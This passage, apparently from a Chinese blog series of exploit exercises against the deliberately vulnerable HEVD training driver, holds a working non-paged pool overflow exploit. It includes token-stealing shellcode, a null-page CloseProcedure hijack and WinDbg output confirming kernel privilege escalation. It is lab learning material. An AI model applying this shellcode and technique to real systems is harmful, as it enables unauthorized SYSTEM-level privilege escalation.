<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd ObTypeIndexTable</span><br><span class="line">83f97760  00000000 bad0b0b0 863437c8 86343700</span><br><span class="line">83f97770  86343638 863ee040 863eef40 863eee78</span><br><span class="line">83f97780  863eedb0 863eece8 863eec20 863ee548</span><br><span class="line">83f97790  86409b50 86402418 86402350 86403418</span><br><span class="line">83f977a0  86403350 86404418 86404350 8640d758</span><br><span class="line">83f977b0  8640d690 8640dda0 8640dcd8 8640d388</span><br><span class="line">83f977c0  8640d2c0 86411930 86411868 86406f78</span><br><span class="line">83f977d0  86406eb0 86406950 86406888 864067c0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _OBJECT_TYPE 86409b50 </span><br><span class="line">nt!_OBJECT_TYPE</span><br><span class="line">   +0x000 TypeList         : _LIST_ENTRY [ 0x86409b50 - 0x86409b50 ]</span><br><span class="line">   +0x008 Name             : _UNICODE_STRING &quot;Event&quot;</span><br><span class="line">   +0x010 DefaultObject    : (null) </span><br><span class="line">   +0x014 Index            : 0xc &#x27;&#x27;</span><br><span class="line">   +0x018 TotalNumberOfObjects : 0x1276</span><br><span class="line">   +0x01c TotalNumberOfHandles : 0x12e2</span><br><span class="line">   +0x020 HighWaterNumberOfObjects : 0x2eea</span><br><span class="line">   +0x024 HighWaterNumberOfHandles : 0x2f56</span><br><span class="line">   +0x028 TypeInfo         : _OBJECT_TYPE_INITIALIZER</span><br><span class="line">   +0x078 TypeLock         : _EX_PUSH_LOCK</span><br><span class="line">   +0x07c Key              : 0x6e657645</span><br><span class="line">   +0x080 CallbackList     : _LIST_ENTRY [ 0x86409bd0 - 0x86409bd0 ]</span><br><span class="line">kd&gt; dx -id 0,0,884c2630 -r1 (*((ntkrpamp!_OBJECT_TYPE_INITIALIZER *)0x86409b78))</span><br><span class="line">(*((ntkrpamp!_OBJECT_TYPE_INITIALIZER *)0x86409b78))                 [Type: _OBJECT_TYPE_INITIALIZER]</span><br><span class="line">    [+0x000] Length           : 0x50 [Type: unsigned short]</span><br><span class="line">    [+0x002] ObjectTypeFlags  : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 0: 0)] CaseInsensitive  : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 1: 1)] UnnamedObjectsOnly : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 2: 2)] UseDefaultObject : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 3: 3)] SecurityRequired : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 4: 4)] MaintainHandleCount : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 5: 5)] MaintainTypeList : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 6: 6)] SupportsObjectCallbacks : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 7: 7)] CacheAligned     : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x004] ObjectTypeCode   : 0x2 [Type: unsigned long]</span><br><span class="line">    [+0x008] InvalidAttributes : 0x100 [Type: unsigned long]</span><br><span class="line">    [+0x00c] GenericMapping   [Type: _GENERIC_MAPPING]</span><br><span class="line">    [+0x01c] ValidAccessMask  : 0x1f0003 [Type: unsigned long]</span><br><span class="line">    [+0x020] RetainAccess     : 0x0 [Type: unsigned long]</span><br><span class="line">    [+0x024] PoolType         : NonPagedPool (0) [Type: _POOL_TYPE]</span><br><span class="line">    [+0x028] DefaultPagedPoolCharge : 0x0 [Type: unsigned long]</span><br><span class="line">    [+0x02c] DefaultNonPagedPoolCharge : 0x40 [Type: unsigned long]</span><br><span class="line">    [+0x030] DumpProcedure    : 0x0 [Type: void (*)(void *,_OBJECT_DUMP_CONTROL *)]</span><br><span class="line">    [+0x034] OpenProcedure    : 0x0 [Type: long (*)(_OB_OPEN_REASON,char,_EPROCESS *,void *,unsigned long *,unsigned long)]</span><br><span class="line">    [+0x038] CloseProcedure   : 0x0 [Type: void (*)(_EPROCESS *,void *,unsigned long,unsigned long)]</span><br><span class="line">    [+0x03c] DeleteProcedure  : 0x0 [Type: void (*)(void *)]</span><br><span class="line">    [+0x040] ParseProcedure   : 0x0 [Type: long (*)(void *,void *,_ACCESS_STATE *,char,unsigned long,_UNICODE_STRING *,_UNICODE_STRING *,void *,_SECURITY_QUALITY_OF_SERVICE *,void * *)]</span><br><span class="line">    [+0x044] SecurityProcedure : 0x840bad90 [Type: long (*)(void *,_SECURITY_OPERATION_CODE,unsigned long *,void *,unsigned long *,void * *,_POOL_TYPE,_GENERIC_MAPPING *,char)]</span><br><span class="line">    [+0x048] QueryNameProcedure : 0x0 [Type: long (*)(void *,unsigned char,_OBJECT_NAME_INFORMATION *,unsigned long,unsigned long *,char)]</span><br><span class="line">    [+0x04c] OkayToCloseProcedure : 0x0 [Type: unsigned char (*)(_EPROCESS *,void *,void *,char)]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面开始编写exp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">shellcode2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		pop edi</span><br><span class="line">		pop esi</span><br><span class="line">		pop ebx</span><br><span class="line">		pushad</span><br><span class="line">		<span class="keyword">xor</span> eax, eax</span><br><span class="line">		mov eax, fs: [<span class="number">124</span>h]</span><br><span class="line">		mov eax, [eax + <span class="number">050</span>h]</span><br><span class="line">		mov ecx, eax</span><br><span class="line">		mov edx, <span class="number">4</span></span><br><span class="line"></span><br><span class="line">		find_sys_pid :</span><br><span class="line">		mov eax, [eax + <span class="number">0b</span>8h]</span><br><span class="line">		sub eax, <span class="number">0b</span>8h</span><br><span class="line">		cmp[eax + <span class="number">0b</span>4h], edx</span><br><span class="line">		jnz find_sys_pid</span><br><span class="line"></span><br><span class="line">		mov edx, [eax + <span class="number">0f</span>8h]</span><br><span class="line">		mov[ecx + <span class="number">0f</span>8h], edx</span><br><span class="line">		popad</span><br><span class="line">		<span class="keyword">xor</span> eax, eax</span><br><span class="line">		ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">BUFFER_OVERFLOW_NON_PAGED_POOL</span><span class="params">(HANDLE dev)</span> </span>&#123;</span><br><span class="line">	DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//0x1f8+28</span></span><br><span class="line">	CHAR buf[<span class="number">0x220</span>];</span><br><span class="line">	<span class="type">int</span> bufLen = <span class="number">0x1f8</span> + <span class="number">0x28</span>;</span><br><span class="line">	<span class="comment">//其他值与event对象保持一致</span></span><br><span class="line">	*(DWORD*)(buf + <span class="number">0x1f8</span> + <span class="number">0x0</span>) = <span class="number">0x04080040</span>;</span><br><span class="line">	*(DWORD*)(buf + <span class="number">0x1f8</span> + <span class="number">0x4</span>) = <span class="number">0xee657645</span>;</span><br><span class="line">	*(DWORD*)(buf + <span class="number">0x1f8</span> + <span class="number">0x8</span>) = <span class="number">0x00000000</span>;</span><br><span class="line">	*(DWORD*)(buf + <span class="number">0x1f8</span> + <span class="number">0xc</span>) = <span class="number">0x00000040</span>;</span><br><span class="line">	*(DWORD*)(buf + <span class="number">0x1f8</span> + <span class="number">0x10</span>) = <span class="number">0x00000000</span>;</span><br><span class="line">	*(DWORD*)(buf + <span class="number">0x1f8</span> + <span class="number">0x14</span>) = <span class="number">0x00000000</span>;</span><br><span class="line">	*(DWORD*)(buf + <span class="number">0x1f8</span> + <span class="number">0x18</span>) = <span class="number">0x00000001</span>;</span><br><span class="line">	*(DWORD*)(buf + <span class="number">0x1f8</span> + <span class="number">0x1c</span>) = <span class="number">0x00000001</span>;</span><br><span class="line">	*(DWORD*)(buf + <span class="number">0x1f8</span> + <span class="number">0x20</span>) = <span class="number">0x00000000</span>;</span><br><span class="line">	*(DWORD*)(buf + <span class="number">0x1f8</span> + <span class="number">0x24</span>) = <span class="number">0x00080000</span>;<span class="comment">//typeIndex更改为0</span></span><br><span class="line">	<span class="comment">//制造内存空洞</span></span><br><span class="line">	<span class="built_in">Spray_NonPagePool</span>();</span><br><span class="line">	<span class="comment">//申请0地址</span></span><br><span class="line">	FUN_NtAllocateVirtualMemory NtAllocateVirtualMemory = <span class="literal">NULL</span>;</span><br><span class="line">	HMODULE ntdll = (HMODULE)<span class="built_in">LoadLibrary</span>(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	NtAllocateVirtualMemory = (FUN_NtAllocateVirtualMemory)<span class="built_in">GetProcAddress</span>(ntdll, <span class="string">&quot;NtAllocateVirtualMemory&quot;</span>);</span><br><span class="line"></span><br><span class="line">	PVOID zeroAddr = (PVOID)<span class="number">1</span>;</span><br><span class="line">	DWORD regionSize = <span class="number">0x1000</span>;</span><br><span class="line">	NTSTATUS status = <span class="built_in">NtAllocateVirtualMemory</span>(INVALID_HANDLE_VALUE, &amp;zeroAddr, <span class="number">0</span>, &amp;regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;allocate 0 addr fail:%x\n&quot;</span>, status);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//CloseProcedure更改为shellcode</span></span><br><span class="line">	*(DWORD*)(<span class="number">0x60</span>) = (DWORD)&amp;shellcode2;</span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(dev, HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL, buf, bufLen, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwRet, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//释放对象,回调shellcode.</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2000</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(spray_event[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">CloseHandle</span>(dev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再次运行,0地址成功申请,0x60处为shellcode,并且下个event typeIndex成功被覆盖为0.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">HEVD!TriggerBufferOverflowNonPagedPool+0xf7:</span><br><span class="line">92fa2dc5 e812c4fbff      call    HEVD!memcpy (92f5f1dc)</span><br><span class="line">kd&gt; p</span><br><span class="line">HEVD!TriggerBufferOverflowNonPagedPool+0xfc:</span><br><span class="line">92fa2dca 688655fa92      push    offset HEVD! ?? ::NNGAKEGL::`string&#x27; (92fa5586)</span><br><span class="line">kd&gt; dd 0</span><br><span class="line">00000000  00000000 00000000 00000000 00000000</span><br><span class="line">00000010  00000000 00000000 00000000 00000000</span><br><span class="line">00000020  00000000 00000000 00000000 00000000</span><br><span class="line">00000030  00000000 00000000 00000000 00000000</span><br><span class="line">00000040  00000000 00000000 00000000 00000000</span><br><span class="line">00000050  00000000 00000000 00000000 00000000</span><br><span class="line">00000060  012a1040 00000000 00000000 00000000</span><br><span class="line">00000070  00000000 00000000 00000000 00000000</span><br><span class="line">kd&gt; !pool 0x866B4488</span><br><span class="line">Pool page 866b4488 region is Nonpaged pool</span><br><span class="line"> 866b4000 size:  200 previous size:    0  (Free)       Even</span><br><span class="line"> 866b4200 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 866b4240 size:  200 previous size:   40  (Free)       Even</span><br><span class="line"> 866b4440 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line">*866b4480 size:  200 previous size:   40  (Allocated) *Hack</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> 866b4680 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 866b46c0 size:  200 previous size:   40  (Free)       Even</span><br><span class="line"> 866b48c0 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 866b4900 size:  200 previous size:   40  (Free)       Even</span><br><span class="line"> 866b4b00 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 866b4b40 size:  200 previous size:   40  (Free)       Even</span><br><span class="line"> 866b4d40 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 866b4d80 size:  200 previous size:   40  (Free)       Even</span><br><span class="line"> 866b4f80 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 866b4fc0 size:   40 previous size:   40  (Free)       Even</span><br><span class="line">kd&gt; dt _OBJECT_HEADER 866b4680+18</span><br><span class="line">nt!_OBJECT_HEADER</span><br><span class="line">   +0x000 PointerCount     : 0n1</span><br><span class="line">   +0x004 HandleCount      : 0n1</span><br><span class="line">   +0x004 NextToFree       : 0x00000001 Void</span><br><span class="line">   +0x008 Lock             : _EX_PUSH_LOCK</span><br><span class="line">   +0x00c TypeIndex        : 0 &#x27;&#x27;</span><br><span class="line">   +0x00d TraceFlags       : 0 &#x27;&#x27;</span><br><span class="line">   +0x00e InfoMask         : 0x8 &#x27;&#x27;</span><br><span class="line">   +0x00f Flags            : 0 &#x27;&#x27;</span><br><span class="line">   +0x010 ObjectCreateInfo : 0x881054c0 _OBJECT_CREATE_INFORMATION</span><br><span class="line">   +0x010 QuotaBlockCharged : 0x881054c0 Void</span><br><span class="line">   +0x014 SecurityDescriptor : (null) </span><br><span class="line">   +0x018 Body             : _QUAD</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img src="/2023/07/16/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-BUFFER_OVERFLOW_NON_PAGED_POOL/image-20230717114721324.png" alt="image-20230717114721324"></p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/07/16/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-ARBITRARY_WRITE/" rel="prev" title="hevd windows内核漏洞练习-ARBITRARY_WRITE">
      <i class="fa fa-chevron-left"></i> hevd windows内核漏洞练习-ARBITRARY_WRITE
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/07/17/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-UNINITIALIZED_MEMORY_PAGED_POOL/" rel="next" title="hevd windows内核漏洞练习-UNINITIALIZED_MEMORY_PAGED_POOL">
      hevd windows内核漏洞练习-UNINITIALIZED_MEMORY_PAGED_POOL <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-BUFFER-OVERFLOW-NON-PAGED-POOL"><span class="nav-number">1.</span> <span class="nav-text">hevd windows内核漏洞练习-BUFFER_OVERFLOW_NON_PAGED_POOL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">1.漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">2.漏洞利用</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Ash</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ash</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
